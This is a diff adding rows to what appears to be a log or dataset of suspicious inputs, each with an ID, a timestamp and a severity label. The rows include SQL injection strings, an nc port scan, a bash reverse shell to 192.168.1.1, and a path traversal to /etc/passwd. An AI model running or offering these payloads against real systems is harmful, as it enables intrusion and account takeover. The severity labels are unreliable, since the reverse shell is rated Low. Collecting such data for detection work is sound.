@@ -37,3 +37,10 @@ b643bf3e-fd0c-465d-9c83-8d69421db8f6,2024-04-25 16:18:21.807793,'aVmoiRoeg9Uf2ip
 87e65221-0c72-49d7-9972-11026d0adbd2,2024-04-25 16:18:24.344984,'UPDATE users SET password = "hacked" WHERE id = 1;',Low
 3c5f7390-81c2-4d2f-aaf7-5d0cde91fca3,2024-04-25 16:18:26.655861,'INSERT INTO users (username, password) VALUES ("hacker", "p@ssword"); nc -zv 192.168.1.1 1-100',Medium
 1420992a-302e-451c-9f5c-f47b110bb8d0,2024-04-25 16:18:28.234602,'/bin/bash -i > /dev/tcp/192.168.1.1/8080 0<&1 2>&1',Low
+0f7684c5-b1c1-467c-a8db-6701bfe9b7e7,2024-04-25 21:05:12.708369,'pLUQAJ1M9syUVG4CU',Low
+967aea3f-2259-4bac-baf2-d9b2f00aaa34,2024-04-25 21:05:12.708369,'bR0noCQqzgI',Low
+31b7cee8-b595-4e6a-b951-9bafe1b6626c,2024-04-25 21:05:14.275965,'netstat',Low
+d2a0be55-9249-4cf1-9aa5-4de5ec98ca44,2024-04-25 21:05:16.872639,'../etc/passwd',Low
+d9006034-c68d-4106-9658-0f92e432767c,2024-04-25 21:05:19.786044,'echo $PATH pwd',Medium
+ea55dc73-baab-4be5-9438-512a68f42b3c,2024-04-25 21:05:19.787044,'KIWlGNX',Low
+6450bd68-f2f0-4247-92c4-0079c468878a,2024-04-25 21:05:24.327880,'admin' OR 1=1 -- UPDATE users SET password = "hacked" WHERE id = 1;',Medium
